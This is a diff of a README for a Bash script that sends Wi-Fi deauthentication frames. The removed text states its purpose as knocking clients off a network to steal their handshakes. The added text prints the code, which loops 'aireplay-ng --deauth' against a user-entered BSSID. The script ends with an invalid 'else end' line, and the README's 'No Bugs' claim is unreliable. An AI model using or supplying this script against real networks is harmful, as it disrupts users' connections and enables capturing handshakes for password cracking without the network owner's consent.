@@ -1,16 +1,26 @@
-# BSSID DeAuth
-> Deauth's users from network
+# Deauthenticate Users from Network
 
-![](header.png)
-
-## Installation
-
-OS X & Linux:
-
-```sh
-Run it as ROOT! 
+```bash
+sudo bash script.bash
 ```
 
-## Why?
+## Features
 
-I got lazy so I made this script to Deauth clients to attempt to steal their handshake
+- Useable on any Linux System with Aireplay.ng 
+- No Bugs
+- Simple to use
+- Made by a pro
+
+## Script's Code
+
+```shell
+echo "Enter BSSID" 
+
+read ssid
+clear
+for i in {1..10}; do sudo aireplay-ng --deauth 2 -a $ssid wlan0 ; date ; sleep 5 ; done
+
+else end 
+```
+
+
